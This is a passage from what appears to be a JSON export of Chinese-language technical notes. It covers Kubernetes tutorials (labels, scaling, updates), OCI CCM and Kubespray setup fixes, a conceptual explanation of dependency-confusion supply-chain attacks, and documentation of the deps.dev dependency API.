61761:10.111.18.163:8080\nLabels 的使用\n前面说过 Service 通过标签来定位所需关联的 Pod，但是在前面的命令中 kubectl expose 命令中并没有指定标签『通过 --selector 选项』，这是因为默认情况下，你可以不指定 --selector 选项，它尝试会从 Replication Controller(RC) 或者 Replica Set(RS) 获取。\n\n现在不用在意 RC 和 RS 是什么，只要知道它们是一种控制器就行。\n\n那么前面创建的 Deployment 的标签有哪些呢？在创建时，并没有手动指定任何标签，查看 hello-node 的详细信息\nkubectl describe deployment hello-node\nName:                   hello-node\nNamespace:              default\nCreationTimestamp:      Thu, 28 Sep 2023 09:40:23 +0800\nLabels:                 app=hello-node\nAnnotations:            deployment.kubernetes.io/revision: 1\nSelector:               app=hello-node\nReplicas:               1 desired | 1 updated | 1 total | 1 available | 0 unavailable\nStrategyType:           RollingUpdate\nMinReadySeconds:        0\nRollingUpdateStrategy:  25% max unavailable, 25% max surge\nPod Template:\n  Labels:  app=hello-node\n  Containers:\n   echo-server:\n    Image:        kicbase/echo-server:1.0\n    Port:         &lt;none&gt;\n    Host Port:    &lt;none&gt;\n    Environment:  &lt;none&gt;\n    Mounts:       &lt;none&gt;\n  Volumes:        &lt;none&gt;\nConditions:\n  Type           Status  Reason\n  ----           ------  ------\n  Available      True    MinimumReplicasAvailable\n  Progressing    True    NewReplicaSetAvailable\nOldReplicaSets:  &lt;none&gt;\nNewReplicaSet:   hello-node-6d5cf99b7b (1/1 replicas created)\nEvents:          &lt;none&gt;\n可以看到包含了一个默认的标签 app=hello-node，它的值就是这个 Deployment 的名字，并且从 Pod Template 中的内容可以看出，通过该 Deployment 定义的 Pod 都包含该标签。\n现在来查看一下携带该标签的 Pod\nkubectl get pods -l app=hello-node\nNAME                          READY   STATUS    RESTARTS   AGE\nhello-node-6d5cf99b7b-gj5vx   1/1     Running   0          5h9m\n可以使用如下命令为 Pod 新增一个标签\nkubectl label pods hello-node-6d5cf99b7b-gj5vx version=v1\n再查看一次该 Pod 的信息，已经包含新增的标签了\nkubectl describe pod hello-node-6d5cf99b7b-gj5vx\nName:             hello-node-6d5cf99b7b-gj5vx\nNamespace:        default\nPriority:         0\nService Account:  default\nNode:             minikube/192.168.49.2\nStart Time:       Thu, 28 Sep 2023 09:40:23 +0800\nLabels:           app=hello-node\n                  pod-template-hash=6d5cf99b7b\n                  version=v1\n删除 Service\n可通过如下命令删除 Service，也可以不指定标签，\nkubectl delete service hello-node -l app=hello-node\nScaling out a Deployment\n下面来了解如何对一个 Deployment 描述的 Pod 进行扩容『横向扩展』。扩容后将确保基于 Deployment 创建新的 Pod 并将其调度到具有可用的 Node 上。如果将 Pod 的数量缩减至 0，那么意味着终止所有的 Pod。\n\nKubernetes 支持 Pod 的 自动伸缩，以后再讨论。\n\n对 Pod 进行扩容就需要解决，如何进行流量的分发，这就需要用到前面学习的 Service。Service 内置了一个负载均衡器用于在关联的 Pod 之间分发流量。Service 使用 Endpoints 持续监控正在运行的 Pod， 以确保流量仅发送到可用的 Pod。\n在开始之前，先来了解一下 kubectl get deployments 命令执行结果中每一列的含义，这个在之前并没有解释\nkubectl get deployments\nNAME         READY   UP-TO-DATE   AVAILABLE   AGE\nhello-node   4/4     4            4           6h51m\n\n\nNAME：Deployment 的名称\nREADY：显示当前 Pod 数量和所需副本的比率\nUP-TO-DATE：显示当前有多少副本已更新至期望的状态\nAVAILABLE：显示当前可用的 Pod 副本数量\nAGE：显示 Pod 已运行的时间。\n\nDeployment 默认使用的控制器是 ReplicaSet，ReplicaSet 的命名格式为 [DEPLOYMENT-NAME]-[RANDOM-STRING]，随机字符串使用的是 ReplicaSet 的标签 pod-template-hash=6d5cf99b7b 作为种子。\n可使用如下命令查看 ReplicaSet，\nkubectl get rs\nNAME                    DESIRED   CURRENT   READY   AGE\nhello-node-6d5cf99b7b   4         4         4       6h46m\n其中两列的含义如下\n\nDESIRED：显示期望的副本数量。\nCURRENT：显示当前运行中的副本数量。\n\n扩容 Pod\n下面开始尝试对前面创建的 Deployment 进行扩容，使用如下命令\nkubectl scale deployments hello-node --replicas=4\n此刻再来查看 ReplicaSet，会发现数量已经增长至 4 个，\nkubectl get rs\nNAME                    DESIRED   CURRENT   READY   AGE\nhello-node-6d5cf99b7b   4         4         4       6h46m\n查看当前的 Pod，这里设定输出格式为 wide，显示更多信息，可以看到 Pod 的数量增涨到了 4 个，并且各自有独立的集群 IP\nkubectl get pods -o wide\nNAME                          READY   STATUS    RESTARTS   AGE     IP            NODE       NOMINATED NODE   READINESS GATES\nhello-node-6d5cf99b7b-4mwkh   1/1     Running   0          71s     10.244.0.8    minikube   &lt;none&gt;           &lt;none&gt;\nhello-node-6d5cf99b7b-gj5vx   1/1     Running   0          6h47m   10.244.0.7    minikube   &lt;none&gt;           &lt;none&gt;\nhello-node-6d5cf99b7b-ldh2w   1/1     Running   0          71s     10.244.0.9    minikube   &lt;none&gt;           &lt;none&gt;\nhello-node-6d5cf99b7b-llzhf   1/1     Running   0          71s     10.244.0.10   minikube   &lt;none&gt;           &lt;none&gt;\n而上述扩容的操作，会在 Deployment 的日志中记录，通过如下命令查看它的 Events\nkubectl describe deployment hello-node\n...\nNewReplicaSet:   hello-node-6d5cf99b7b (4/4 replicas created)\nEvents:\n  Type    Reason             Age   From                   Message\n  ----    ------             ----  ----                   -------\n  Normal  ScalingReplicaSet  110s  deployment-controller  Scaled up replica set hello-node-6d5cf99b7b to 4 from 1\n负载均衡\n如果前面创建的 Service 被删除的话，你可以重新创建它\nkubectl expose deployment hello-node --type=&quot;NodePort&quot; --port=8080\n查看一下之前创建的 Service\nkubectl describe services hello-node\nName:                     hello-node\nNamespace:                default\nLabels:                   app=hello-node\nAnnotations:              &lt;none&gt;\nSelector:                 app=hello-node\nType:                     NodePort\nIP Family Policy:         SingleStack\nIP Families:              IPv4\nIP:                       10.105.207.65\nIPs:                      10.105.207.65\nPort:                     &lt;unset&gt;  8080/TCP\nTargetPort:               8080/TCP\nNodePort:                 &lt;unset&gt;  31534/TCP\nEndpoints:                10.244.0.10:8080,10.244.0.7:8080,10.244.0.8:8080 + 1 more...\n可以看到与之前相比，Endpoints 的数量也同时增加到了 4 个，分别对应前面 4 个 Pod 的 IP 地址。\n缩减 Pod\n缩减 Pod 数量的操作与前面类似，修改 --replicas 选项即可，下面的命令将副本数量缩减至 2\nkubectl scale deployments hello-node --replicas=2\n下面尝试把 --replicas 设置为 0，看看会发生什么\nkubectl scale deployments hello-node --replicas=0\n查看当前 Pod，发现都没有了\nkubectl get pods\nNo resources found in default namespace.\n查看 ReplicaSet 都日志，会发现都被删除了\nkubectl describe rs hello-node-6d5cf99b7b\nName:           hello-node-6d5cf99b7b\n// ...\nEvents:\n  Type    Reason            Age   From                   Message\n  ----    ------            ----  ----                   -------\n// ...\n  Normal  SuccessfulDelete  32s   replicaset-controller  Deleted pod: hello-node-6d5cf99b7b-gj5vx\n  Normal  SuccessfulDelete  32s   replicaset-controller  Deleted pod: hello-node-6d5cf99b7b-ldh2w\n相应的 Service 中的 Endpoints 也空了\nkubectl describe services hello-node\nName:                     hello-node\n// ...\nEndpoints:                &lt;none&gt;\n更新 Deployment\n最后来学习，如何更新 Deployment 中发布的应用。在 Kubernetes 中，更新是带版本控制的，任何更新都可以恢复到以前的（稳定）版本。\n下面尝试对之前的创建的 Deployment 进行更新，下面的命令表示对名为 hello-node 的 Deployment，更新其中名称为 echo-server『名称可通过 kubectl describe deployment 获取』的镜像为 kicbase/echo-server:2.0，\nkubectl set image deployments hello-node echo-server=kicbase/echo-server:2.0\n此时查看 Pod\nkubectl get pods\nNAME                          READY   STATUS             RESTARTS   AGE\nhello-node-59d99f6c4c-xxcsl   0/1     ImagePullBackOff   0          60s\nhello-node-6d5cf99b7b-n4mgm   1/1     Running            0          3m43s\n会发现有一个 Pod 的状态为 ImagePullBackOff，表示正在后台拉去新的镜像，不过由于镜像 kicbase/echo-server:2.0 并不存在，所以会一直卡住，这里只是做一个演示。可以通过查看 Pod 的日志来确定问题\nkubectl describe pod hello-node-59d99f6c4c-8l7vw\n...\nEvents:\n  Type     Reason     Age                From               Message\n  ----     ------     ----               ----               -------\n  Normal   Scheduled  30s                default-scheduler  Successfully assigned default/hello-node-59d99f6c4c-8l7vw to minikube\n  Normal   BackOff    25s                kubelet            Back-off pulling image &quot;kicbase/echo-server:2.0&quot;\n  Warning  Failed     25s                kubelet            Error: ImagePullBackOff\n  Normal   Pulling    11s (x2 over 29s)  kubelet            Pulling image &quot;kicbase/echo-server:2.0&quot;\n  Warning  Failed     8s (x2 over 26s)   kubelet            Failed to pull image &quot;kicbase/echo-server:2.0&quot;: rpc error: code = Unknown desc = Error response from daemon: manifest for kicbase/echo-server:2.0 not found: manifest unknown: manifest unknow\n现在回退更新，很简单，执行如下命令即可，\nkubectl rollout undo deployments hello-node\n当然你也可以将镜像改为 kicbase/echo-server:1.0 并重新执行命令，但本质上这不是回退，而是另一次更新。\nkubectl set image deployments hello-node echo-server=kicbase/echo-server:1.0"},"archived/kubernetes/Kubernetes---OCI-CCM-安装":{"title":"Kubernetes - OCI CCM 安装","links":[],"tags":["kubernetes","oci","ccm"],"content":"\n项目主页见 OCI Cloud Controller Manager (CCM)。\n\n安装步骤\n安装前的准备工作：\n\n在每个所有 node 节点的 kubelet 中设置参数 --cloud-provider=external。\n在每个所有 node 节点的 kubelet 中设置参数 --provider-id=&lt;instanceID&gt;，&lt;instanceID&gt; 为云主机的 OCID。\n在  kube-controller-manager 中设置 --cloud-provider=external 参数。\n\n设置 providerID\n集群环境是通过 Kubespray 安装的，可通过修改 kubelet.evn 文件，在环境变量 KUBELET_CLOUDPROVIDER 中添加 --cloud-provider=external 和 --provider-id=&lt;instanceID&gt; 参数\n这种方式实测不生效，最后通过以下命令\nkubectl edit node &lt;node_name&gt;\n手动编辑各个 node 的信息，在 spec 字段下添加 providerID\nspec:\n  podCIDR: 10.233.64.0/24\n  podCIDRs:\n  - 10.233.64.0/24\n  providerID: &lt;ocid&gt;\n创建 Secret\n紧接着，创建一个 Secret，其中包含 CCM 所需的认证信息\n\n模版文件见，provider-config-example.yaml\n\nkubectl create secret generic oci-cloud-controller-manager \\\n     -n kube-system \\\n     --from-file=cloud-provider.yaml=&lt;provider-config-example.yaml&gt;\n将 &lt;provider-config-example.yaml&gt; 替换成自己的配置文件即可。有关如何获取模板文件中所需的内容，可以参考 OCI 的开发者文档 Required Keys and OCIDs\n创建 CCM\n最后创建如下资源，替换 ? 为所需版本，如果集群没有启用 RABC，则可以忽略下发 oci-cloud-controller-manager-rbac.yaml\nexport RELEASE=?\nkubectl apply -f &quot;github.com/oracle/oci-cloud-controller-manager/releases/download/${RELEASE}/oci-cloud-controller-manager-rbac.yaml&quot;\nkubectl apply -f &quot;github.com/oracle/oci-cloud-controller-manager/releases/download/${RELEASE}/oci-cloud-controller-manager.yaml&quot;\nTroubleBoosting\n跟着仓库提供的 教程，创建一个类型为 LoadBalancer 的 Service，pod oci-cloud-controller-manager-xxxxx 出现如下错误\n...\nService error:LimitExceeded. The following service limits were exceeded: lb-100mbps-count.\n...\n\n错误的原因是，所使用 LoadBalancer，免费情况下只提供 10 Mbps 带宽，但 CCM 默认创建的弹性 LoadBalancer 最大带宽却是 100 Mbps。\n为此需要修改对应的 Service，在 annotations 中添加如下内容\nannotations:\n  service.beta.kubernetes.io/oci-load-balancer-shape: &quot;flexible&quot;\n  service.beta.kubernetes.io/oci-load-balancer-shape-flex-min: &quot;10&quot;\n  service.beta.kubernetes.io/oci-load-balancer-shape-flex-max: &quot;10&quot;\n\ngithub.com/oracle/oci-cloud-controller-manager/issues/378 『LoadBalancer 速率超出租期服务限制』\ngithub.com/oracle/oci-cloud-controller-manager/issues/409 『Kubespray 安装的集群，修改 kubelete.env 不生效』\n"},"archived/kubernetes/Kubernetes-Kubespray-多架构下的安装":{"title":"Kubernetes - Kubespray 多架构下的安装","links":[],"tags":[],"content":"在不同架构的机器上，使用 kubespray 安装 kubernetes 时出现如下错误。\nfatal: [master1]: FAILED! =&gt; {&quot;attempts&quot;: 4, &quot;changed&quot;: true, &quot;checksum_dest&quot;: null, &quot;checksum_src&quot;: &quot;d283b806282faaccdb9d85e033ba964729ee2ddd&quot;, &quot;dest&quot;: &quot;/tmp/releases/runc-v1.1.9.arm64&quot;, &quot;elapsed&quot;: 0, &quot;msg&quot;: &quot;The checksum for /tmp/releases/runc-v1.1.9.arm64 did not match b43e9f561e85906f469eef5a7b7992fc586f750f44a0e011da4467e7008c33a0; it was b9bfdd4cb27cddbb6172a442df165a80bfc0538a676fbca1a6a6c8f4c6933b43.&quot;, &quot;src&quot;: &quot;/root/.ansible/tmp/ansible-moduletmp-1694598039.95798-ehx0rgi6/tmpummt4_8i&quot;, &quot;url&quot;: &quot;github.com/opencontainers/runc/releases/download/v1.1.9/runc.amd64&quot;}\n\nb43e9f561e85906f469eef5a7b7992fc586f750f44a0e011da4467e7008c33a0 对应的是 runc.arm64 v1.1.9\nb9bfdd4cb27cddbb6172a442df165a80bfc0538a676fbca1a6a6c8f4c6933b43 对应的是 runc.amd64 v1.1.9\n很明显比较校验和的方式出现了问题，网上没有查找到准确的原因。\n解决方案参考的是 kubespray doesn’t support two architectures in one cluster 下 ricard0javier 的回答，将 /roles/download/tasks/download_file.yml 文件 87 行中的\nurl: &quot;{{ valid_mirror_urls | random }}&quot;\n\n替换为\nurl: &quot;{{ download.url }}&quot;\n\n之后再执行\nansible-playbook -i inventory/mycluster/hosts.yaml -b cluster.yml"},"archived/projects/github-starred-updater/Starred-Repositories-自动更新展示":{"title":"Starred Repositories 自动更新展示","links":[],"tags":["project"],"content":"期望实现的功能\n\n 新建一个仓库\n 配合 github action 自动扫描当前用户已经 starred 的仓库，并根据 tag 更新 README.md\n 让 github action 定时运行，或者在 star 某个仓库后允许\n\n参考\n\nTILs from Dan Nguyen\ngithub action 定时任务\n\nRunning a CRON Job with GitHub Actions | Nacelle Docs\nSchedule Cron Jobs With GitHub Actions | by Mateusz Jasiński | Better Programming\nEvents that trigger workflows - GitHub Docs\n\n\n"},"archived/projects/supply-chains/After-the-Advisory":{"title":"After the Advisory","links":[],"tags":["oss"],"content":"\nSecurity Day 2022 on Google Open Source Live 上，Nicky Ringland 发表的谈话。\n\n\n 文章，After the Advisory | Open Source Insights\n 视频，After advisory: dependencies post disclosure | Security Day 2022 on Google Open Source Live - YouTube\n\n作者首先介绍了开源软件生态下，漏洞的传播效应，和修复策略以及通常会遇到的问题。并以 Maven 生态的 Log4Shell 和 NPM 生态的 Color 事件为例，对比了不同生态下，包管理系统的不同而产生的漏洞传播和修复速度的差异。\nThe Amplification of Vulnerability Impact\n作者统计了大约有 20 万（0.4%）软件包直接受到漏洞影响，大约 1500 万（33%）软件包间接受到漏洞影响。\nAddressing Vulnerabilities in Your Dependencies\n如何在项目依赖中定位并修复漏洞？作者举例了几种情况。\n项目的直接依赖存在漏洞，那么更新它至修复版本，\n\n间接依赖存在漏洞，但是直接依赖已经更新并修复了此问题，那么直接更新直接依赖，\n\n直接更新间接依赖，但是可能会引起不兼容的问题，\n\n删除间接依赖，直接依赖依旧能够使用，或直接删除使用了受漏洞影响的直接依赖『但是，不会有人轻易这样做，毕竟你并不会随意将一个依赖添加进来』。\n\n而实际情况中，依赖关系图远比这复杂的多，express。\nDefault Versions: New or Old?\n对比了 Maven/Go 和 NPM/PyPi 包管理的差异，前者通常在项目中使用 “soft” version requirements，也就是指定一个固定的版本。而后者更倾向于选择最新的兼容版本。\n前者的好处是，稳定，兼容，但是会导致漏洞的修复过程变得十分缓慢，比如 Log4Shell 事件。\n后者的好处是，修复会被更快的传播，但是如果被恶意利用。虚假的开发者也能更快的传播恶意代码。\nEvery Dependency is a Trust Relationship\n作者对比 color 和 log4shell 事件后，提到两类包管理系统各有优缺点，但它们对依赖的处理机制都不是最好的解决方式。\n而依赖本身是一种信任关系，如果出现破裂就可能会导致安全问题。对依赖的管理并没有完美的『银弹』解决方法，更多的需要靠维护者的投入和管理，作为项目管理者需要明确依赖引入的原因和风险，并且能够在后续维护这些依赖关系。"},"archived/projects/supply-chains/Dependency-Confusion-Vulnerability":{"title":"Dependency Confusion Vulnerability","links":[],"tags":[],"content":"2021 年 2 月 9 日，安全研究员 Alex Birsan，发布了一篇 文章，介绍依赖管理工具在处理依赖的顺序上可能存在的安全问题。可以通过这篇文章了解，依赖混淆漏洞（Dependecy Confusion Vulnerability）。\n微软发布了 白皮书，其中描述了缓解措施。\n当执行 pip install -r requiremetns.txt 命令的时候，是否有想过，你所安装的包可能不是来自开源的仓库。又或者安装的包中包含了后门。下面是个例子，介绍依赖混淆攻击，来自 x1337loser。\n假设你有一个项目 A ，它依赖了很多第三方库，例如 react-router ，在很多公司的开发流程中也会使用。假设你入职了一个新公司接手一个已有的项目，可是前员工只给你留下了代码（包含 package.json 一类的包管理文件），你尝试运行 npm -i 安装依赖并试着运行。但 package.json 文件可能包含的私有包，这些私有包通常由公司内部的服务器维护。可如果，攻击者在公开的包管理服务器中上传了同名的恶意包呢？npm 会安装攻击者上传的包，还是公司内部服务器中的包。\n文章\n\nDependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies | by Alex Birsan | Medium\nvisma-prodsec/confused: Tool to check for dependency confusion vulnerabilities in multiple package management systems (github.com)\nx1337loser/Dependency-Confusion: All About Dependency Confusion Attack, (Detecting, Finding, Mitigating) (github.com)\n"},"archived/projects/supply-chains/Dependency-Data-for-Secure-Supply-Chains":{"title":"Dependency Data for Secure Supply Chains","links":[],"tags":["deps","open-source-security"],"content":"谷歌的 Open Source Security 团队开放了开源软件的数据查询接口 deps.dev。目前支持的生态包括 GO, NPM, CARGO, MAVEN, PYPI, NUGE，其数据从公开范围收集，具体说明如下：\n\n对于 Maven 包，除了 Maven Central 之外，它还从 Jenkins 和 Google 注册中心收集工件（一般为 Jar 包）。\n对于 PyPI，它只收集作为 wheels 和 sdists 发布的包。\n对于 Go，它只收集通过 proxy.golang.org 获取的模块，以及那些被这些模块声明为依赖项的模块。\n对于托管在 GitHub、GitLab 和 Bitbucket 上的项目，仅收集与服务已知的包关联的项目。\n\nAPI 使用说明\n具有以下接口：\nGetPackage\nGetPackage 返回有关包的信息，包括其可用版本的列表，默认版本标记为已知。\nGET /v3alpha/systems/{packageKey.system}/packages/{packageKey.name}\n\n参数\n\npackageKey.system: string\n\n包所属的生态\n\n\npackageKey.name: string\n\n包名\n\n\n\n示例，/v3alpha/systems/npm/packages/%40colors%2Fcolors\n{\n  &quot;packageKey&quot;: {\n    &quot;system&quot;: &quot;NPM&quot;,\n    &quot;name&quot;: &quot;@colors/colors&quot;\n  },\n  &quot;versions&quot;: [\n    {\n      &quot;versionKey&quot;: {\n        &quot;system&quot;: &quot;NPM&quot;,\n        &quot;name&quot;: &quot;@colors/colors&quot;,\n        &quot;version&quot;: &quot;1.4.0&quot;\n      },\n      &quot;isDefault&quot;: false\n    },\n    {\n      &quot;versionKey&quot;: {\n        &quot;system&quot;: &quot;NPM&quot;,\n        &quot;name&quot;: &quot;@colors/colors&quot;,\n        &quot;version&quot;: &quot;1.5.0&quot;\n      },\n      &quot;isDefault&quot;: true\n    }\n  ]\n}\n响应的结构如下，其中 versions[].isDefault 表示是否为默认版本，即 latest 版本或默认安装的版本。\n@startjson\n#highlight &quot;packageKey&quot; / &quot;system&quot;\n#highlight &quot;versions&quot; / &quot;0&quot; / &quot;versionKey&quot; / &quot;name&quot;\n#highlight &quot;versions&quot; / &quot;0&quot; / &quot;versionKey&quot; / &quot;version&quot;\n{\n\t&quot;packageKey&quot;: {\n\t   &quot;system&quot;: &quot;NPM&quot;,\n\t   &quot;name&quot;: &quot;@colors/colors&quot;\n\t},\n\t&quot;versions&quot;: [\n\t\t{\n\t      &quot;versionKey&quot;: {\n\t        &quot;system&quot;: &quot;NPM&quot;,\n\t        &quot;name&quot;: &quot;@colors/colors&quot;,\n\t        &quot;version&quot;: &quot;1.4.0&quot;\n\t      },\n\t      &quot;isDefault&quot;: false\n\t    }\n\t]\n}\n@endjson\nGetVersion\nGetVersion 返回特定版本的包的信息，包括其许可证和相关的安全建议『漏洞』。\nGET /v3alpha/systems/{versionKey.system}/packages/{versionKey.name}/versions/{versionKey.version}\n\n参数\n\nversionKey.system: string\n\n包所属的生态\n\n\nversionKey.name: string\n\n包名\n\n\nversionKey.version: string\n\n包的版本\n\n\n\n示例，/v3alpha/systems/npm/packages/%40colors%2Fcolors/versions/1.5.0\n{\n  &quot;versionKey&quot;: {\n    &quot;system&quot;: &quot;NPM&quot;,\n    &quot;name&quot;: &quot;@colors/colors&quot;,\n    &quot;version&quot;: &quot;1.5.0&quot;\n  },\n  &quot;isDefault&quot;: true,\n  &quot;licenses&quot;: [\n    &quot;MIT&quot;\n  ],\n  &quot;advisoryKeys&quot;: [],\n  &quot;links&quot;: [\n    {\n      &quot;label&quot;: &quot;SOURCE_REPO&quot;,\n      &quot;url&quot;: &quot;git+ssh://git@github.com/DABH/colors.js.git&quot;\n    },\n    {\n      &quot;label&quot;: &quot;ISSUE_TRACKER&quot;,\n      &quot;url&quot;: &quot;github.com/DABH/colors.js/issues&quot;\n    },\n    {\n      &quot;label&quot;: &quot;HOMEPAGE&quot;,\n      &quot;url&quot;: &quot;github.com/DABH/colors.js&quot;\n    }\n  ]\n}\n响应结构如下\n@startjson\n#highlight &quot;packageKey&quot; / &quot;system&quot;\n#highlight &quot;versions&quot; / &quot;0&quot; / &quot;versionKey&quot; / &quot;name&quot;\n#highlight &quot;versions&quot; / &quot;0&quot; / &quot;versionKey&quot; / &quot;version&quot;\n{\n\t&quot;versionKey&quot;: {\n\t   &quot;system&quot;: &quot;NPM&quot;,\n\t   &quot;name&quot;: &quot;@colors/colors&quot;,\n\t   &quot;version&quot;: &quot;1.5.0&quot;\n\t},\n\t&quot;isDefault&quot;: true,\n\t&quot;license&quot;: [\n\t\t&quot;MIT&quot;\n\t],\n\t&quot;advisoryKeys&quot;: [],\n\t&quot;links&quot;: [\n\t\t{\n\t\t\t&quot;label&quot;: &quot;HOMEPAGE&quot;,\n\t\t\t&quot;url&quot;: &quot;github.com/DABH/colors.js&quot;\n\t    }\n\t]\n}\n@endjson\nGetDependencies\nGetDependencies 返回给定包版本的解析依赖关系图。\nGET /v3alpha/systems/{versionKey.system}/packages/{versionKey.name}/versions/{versionKey.version}:dependencies\n\n参数\n\nversionKey.system: string\n\n包所属的生态\n\n\nversionKey.name: string\n\n包名\n\n\nversionKey.version: string\n\n包的版本\n\n\n\n示例，/v3alpha/systems/npm/packages/react/versions/18.2.0:dependencies\n{\n  &quot;nodes&quot;: [\n    {\n      &quot;versionKey&quot;: {\n        &quot;system&quot;: &quot;NPM&quot;,\n        &quot;name&quot;: &quot;react&quot;,\n        &quot;version&quot;: &quot;18.2.0&quot;\n      },\n      &quot;bundled&quot;: false,\n      &quot;errors&quot;: []\n    },\n    {\n      &quot;versionKey&quot;: {\n        &quot;system&quot;: &quot;NPM&quot;,\n        &quot;name&quot;: &quot;js-tokens&quot;,\n        &quot;version&quot;: &quot;4.0.0&quot;\n      },\n      &quot;bundled&quot;: false,\n      &quot;errors&quot;: []\n    },\n    {\n      &quot;versionKey&quot;: {\n        &quot;system&quot;: &quot;NPM&quot;,\n        &quot;name&quot;: &quot;loose-envify&quot;,\n        &quot;version&quot;: &quot;1.4.0&quot;\n      },\n      &quot;bundled&quot;: false,\n      &quot;errors&quot;: []\n    }\n  ],\n  &quot;edges&quot;: [\n    {\n      &quot;fromNode&quot;: 0,\n      &quot;toNode&quot;: 2,\n      &quot;requirement&quot;: &quot;^1.1.0&quot;\n    },\n    {\n      &quot;fromNode&quot;: 2,\n      &quot;toNode&quot;: 1,\n      &quot;requirement&quot;: &quot;^3.0.0 || ^4.0.0&quot;\n    }\n  ],\n  &quot;error&quot;: &quot;&quot;\n}\n响应结构如下\n@startjson\n#highlight &quot;packageKey&quot; / &quot;system&quot;\n#highlight &quot;versions&quot; / &quot;0&quot; / &quot;versionKey&quot; / &quot;name&quot;\n#highlight &quot;versions&quot; / &quot;0&quot; / &quot;versionKey&quot; / &quot;version&quot;\n{\n\t&quot;nodes&quot;: [\n\t\t{\n\t\t    &quot;versionKey&quot;: {\n\t        &quot;system&quot;: &quot;NPM&quot;,\n\t        &quot;name&quot;: &quot;react&quot;,\n\t        &quot;version&quot;: &quot;18.2.0&quot;\n\t\t},\n\t    &quot;bundled&quot;: false,\n\t    &quot;errors&quot;: []\n\t    },\n\t\t{\n\t\t\t&quot;versionKey&quot;: {\n\t\t\t\t&quot;system&quot;: &quot;NPM&quot;,\n\t\t\t\t&quot;name&quot;: &quot;js-tokens&quot;,\n\t\t\t\t&quot;version&quot;: &quot;4.0.0&quot;\n\t\t\t},\n\t\t\t&quot;bundled&quot;: false,\n\t\t\t&quot;errors&quot;: []\n\t\t},\n\t\t{\n\t\t\t&quot;versionKey&quot;: {\n\t\t\t\t&quot;system&quot;: &quot;NPM&quot;,\n\t\t\t\t&quot;name&quot;: &quot;loose-envify&quot;,\n\t\t\t\t&quot;version&quot;: &quot;1.4.0&quot;\n\t\t\t},\n\t\t\t&quot;bundled&quot;: false,\n\t\t\t&quot;errors&quot;: []\n\t\t}\n\t],\n\t&quot;edges&quot;: [\n\t\t{\n\t\t\t&quot;fromNode&quot;: 0,\n\t\t\t&quot;toNode&quot;: 2,\n\t\t\t&quot;requirement&quot;: &quot;^1.1.0&quot;\n\t\t},\n\t\t{\n\t\t\t&quot;fromNode&quot;: 2,\n\t\t\t&quot;toNode&quot;: 1,\n\t\t\t&quot;requirement&quot;: &quot;^3.0.0 || ^4.0.0&quot;\n\t\t}\n\t],\n\t&quot;error&quot;: &quot;&quot;\n}\n@endjson\n响应字段说明\n\nnodes[]: object[]\n\n依赖图的节点，第一个节点是图的根。\n\n\nnodes[].versionKey\n\n包的信息，生态，包名，版本。\n\n\nnodes[].bundled: boolean\n\n如果为真，此为捆绑依赖项，对于捆绑依赖项，verisonKey 的 name 会描述其构成。如，name 为 a&gt;1.2.3&gt;b&gt;c，表示版本为 1.2.3 的包 a 的依赖关系图的一部分，并且具有一个 local 名称 c ，可能与 global 名称为 c 的包相同或者不同。\n\n\nnodes[].errors[]: string[]\n\n与图的此节点关联的错误，例如未解决的依赖性要求，没有固定格式。\n\n\nedges[]: object[]\n\n依赖图的边\n\n\nedges[].fromNode: number\n\n声明依赖关系的起始节点，指定了在 node 种的索引。\n\n\nedges[].toNode: number\n\n声明依赖关系的目标节点，指定了在 node 种的索引。\n\n\nedges[].requirement: string\n\n声明 fromNode 节点的依赖需求，它的值在不同生态中可能不一样，例如，在 npm 中，^1.0.0 表示 fromNode 节点需要至少 1.0.0 版本的 toNode 作为依赖。\n\n\n\nGetProject\nGetProject 返回有关由 GitHub、GitLab 或 BitBucket 托管的项目的信息。\nGET /v3alpha/projects/{projectKey.id}\n\n参数\n\nprojectKey.id: string projectKey.id: string\n\n形式为 github.com/user/repo 、 gitlab.com/user/repo 或 bitbucket.org/user/repo 的项目标识符。\n\n\n\n示例，/v3alpha/projects/github.com%2Ffacebook%2Freact\n{\n  &quot;projectKey&quot;: { &quot;id&quot;: &quot;github.com/facebook/react&quot; },\n  &quot;openIssuesCount&quot;: &quot;1235&quot;,\n  &quot;starsCount&quot;: &quot;205557&quot;,\n  &quot;forksCount&quot;: &quot;42814&quot;,\n  &quot;license&quot;: &quot;MIT&quot;,\n  &quot;description&quot;: &quot;The library for web and native user interfaces&quot;,\n  &quot;homepage&quot;: &quot;react.dev&quot;,\n  &quot;scorecard&quot;:\n    {\n      &quot;repository&quot;:\n        {\n          &quot;name&quot;: &quot;github.com/facebook/react&quot;,\n          &quot;commit&quot;: &quot;2655c9354d8e1c54ba888444220f63e836925caa&quot;,\n        },\n      &quot;scorecard&quot;:\n        {\n          &quot;version&quot;: &quot;v4.8.0-75-gef79b94&quot;,\n          &quot;commit&quot;: &quot;ef79b9487d8f8bf6fca7b0bafc8c55049d925403&quot;,\n        },\n      &quot;checks&quot;:\n        [\n          {\n            &quot;name&quot;: &quot;Code-Review&quot;,\n            &quot;documentation&quot;:\n              {\n                &quot;shortDescription&quot;: &quot;Determines if the project requires code review before pull requests (aka merge requests) are merged.&quot;,\n                &quot;url&quot;: &quot;github.com/ossf/scorecard/blob/ef79b9487d8f8bf6fca7b0bafc8c55049d925403/docs/checks.md#code-review&quot;,\n              },\n            &quot;score&quot;: &quot;8&quot;,\n            &quot;reason&quot;: &quot;21 out of last 24 changesets reviewed before merge -- score normalized to 8&quot;,\n            &quot;details&quot;: [],\n          },\n          {\n            &quot;name&quot;: &quot;Maintained&quot;,\n            &quot;documentation&quot;:\n              {\n                &quot;shortDescription&quot;: &#039;Determines if the project is &quot;actively maintained&quot;.&#039;,\n                &quot;url&quot;: &quot;github.com/ossf/scorecard/blob/ef79b9487d8f8bf6fca7b0bafc8c55049d925403/docs/checks.md#maintained&quot;,\n              },\n            &quot;score&quot;: &quot;10&quot;,\n            &quot;reason&quot;: &quot;30 commit(s) out of 30 and 6 issue activity out of 30 found in the last 90 days -- score normalized to 10&quot;,\n            &quot;details&quot;: [],\n          },\n          {\n            &quot;name&quot;: &quot;Vulnerabilities&quot;,\n            &quot;documentation&quot;:\n              {\n                &quot;shortDescription&quot;: &quot;Determines if the project has open, known unfixed vulnerabilities.&quot;,\n                &quot;url&quot;: &quot;github.com/ossf/scorecard/blob/ef79b9487d8f8bf6fca7b0bafc8c55049d925403/docs/checks.md#vulnerabilities&quot;,\n              },\n            &quot;score&quot;: &quot;10&quot;,\n            &quot;reason&quot;: &quot;no vulnerabilities detected&quot;,\n            &quot;details&quot;: [],\n          },\n          {\n            &quot;name&quot;: &quot;CII-Best-Practices&quot;,\n            